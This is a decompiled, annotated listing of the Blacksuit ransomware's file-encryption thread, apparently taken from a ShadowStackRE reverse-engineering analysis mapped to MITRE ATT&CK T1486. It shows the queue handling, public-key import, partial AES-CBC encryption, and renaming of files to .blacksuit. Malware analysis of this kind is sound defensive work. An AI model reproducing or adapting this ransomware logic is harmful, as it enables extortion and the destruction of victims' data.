////////////////////////////////////////////////////////////
// Blacksuit Encryptor
// https://www.shadowstackre.com/analysis/blacksuit-ransomware-esxi
//
// Technique: Data encrypted for impact
// URL: https://attack.mitre.org/techniques/T1486/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

// Thread to handle encrypting a file
// File extension: .blacksuit
void *__fastcall thread_encrypt_file(void *a1)
{
  int *v1; // rax
  data_fileb *v3; // rbx
  int encrytLoopStatus; // ebx
  const char *errnoAddress; // rax
  unsigned int errnoAddress_1; // ebx
  const char *errFileName; // rax
  char renameStatus; // bl
  unsigned int errnoAddress_2; // ebx
  const char *v10; // rax
  const char *v11; // rax
  data_fileb *v12; // rbx
  char fileName[16]; // [rsp+10h] [rbp-60h] BYREF
  char v14[16]; // [rsp+20h] [rbp-50h] BYREF
  char oldName[16]; // [rsp+30h] [rbp-40h] BYREF
  __int64 bio_pubKey; // [rsp+40h] [rbp-30h]
  data_fileb *ptrDataFile; // [rsp+48h] [rbp-28h]

  bio_pubKey = import_public(key);              // Import the public key from the .data section
  if ( bio_pubKey )
  {
    v3 = (data_fileb *)operator new(0x40190uLL);
    data_fileb::data_fileb(v3);
    ptrDataFile = v3;
    do
    {
      while ( 1 )
      {
        *((_BYTE *)ptrDataFile + 262298) = 0;
        pthread_mutex_lock(&mutex);
        if ( std::list<std::string,std::allocator<std::string>>::size(&queue) )
          break;
        pthread_cond_wait(&condvar, &mutex);
        pthread_mutex_unlock(&mutex);
      }
      ((void (*)(void))get_filename_from_queue)();
      pthread_mutex_unlock(&mutex);
      if ( std::string::length((std::string *)v14) )
      {
        std::string::operator=(ptrDataFile, v14);
        // Prepare the encryption settings, such as the
        // encryption percentage based on the file attributes
        if ( (unsigned __int8)prepare_encryption_settings((__int64)ptrDataFile, bio_pubKey) != 1 )
          goto LABEL_9;
        while ( *((_BYTE *)ptrDataFile + 262297) != 1 )
        {
          // Read the file contents upto parts of ptrDataFile
          if ( (unsigned __int8)read_file(ptrDataFile) != 1 )
          {
            *((_BYTE *)ptrDataFile + 262298) = 1;
            break;
          }
          // Encrypt parts of the file using AES CBC
          if ( (unsigned __int8)aes_cbc_encrypt_file(ptrDataFile) != 1 )
          {
            *((_BYTE *)ptrDataFile + 262298) = 1;
            break;
          }
          // Write the newly encrypted data
          if ( (unsigned __int8)write_file(ptrDataFile) != 1 )
          {
            *((_BYTE *)ptrDataFile + 262298) = 1;
            break;
          }
        }
        if ( *((_BYTE *)ptrDataFile + 262298) )
        {
LABEL_9:
          errnoAddress = (const char *)std::string::c_str(ptrDataFile);
          logs::print((logs *)"Failed encrypt: %s", errnoAddress);
          release_resources(ptrDataFile);
          encrytLoopStatus = 1;
        }
        else if ( (unsigned __int8)write_end_files(ptrDataFile) != 1 )
        {
          errnoAddress_1 = *__errno_location();
          errFileName = (const char *)std::string::c_str(ptrDataFile);
          logs::print((logs *)"Failed encrypt: write end file: %s(%d)", errFileName, errnoAddress_1);
          release_resources(ptrDataFile);
          encrytLoopStatus = 1;
        }
        else
        {
          std::string::string((std::string *)fileName, ptrDataFile);
          release_resources(ptrDataFile);
          std::string::string((std::string *)oldName, (const std::string *)fileName);
          // rename the specified files by replacing the the original extension with .blacksuit
          renameStatus = rename_file(oldName);
          std::string::~string(oldName);
          if ( renameStatus )
          {
            errnoAddress_2 = *__errno_location();
            v10 = (const char *)std::string::c_str((std::string *)fileName);
            logs::print((logs *)"Failed rename file: %s(%d)", v10, errnoAddress_2);
          }
          v11 = (const char *)std::string::c_str((std::string *)fileName);
          logs::print((logs *)"Encrypted file: %s", v11);
          std::string::~string(fileName);
          encrytLoopStatus = 2;
        }
      }
      else
      {
        encrytLoopStatus = 0;
      }
      std::string::~string(v14);
    }
    while ( encrytLoopStatus );
    release_resources(ptrDataFile);
    v12 = ptrDataFile;
    if ( ptrDataFile )
    {
      data_fileb::~data_fileb(ptrDataFile);
      operator delete(v12);
    }
    EVP_PKEY_free(bio_pubKey);
    return 0LL;
  }
  else
  {
    v1 = __errno_location();
    logs::print((logs *)"Failed key import: (%d)", (const char *)(unsigned int)*v1);
    return 0LL;
  }
}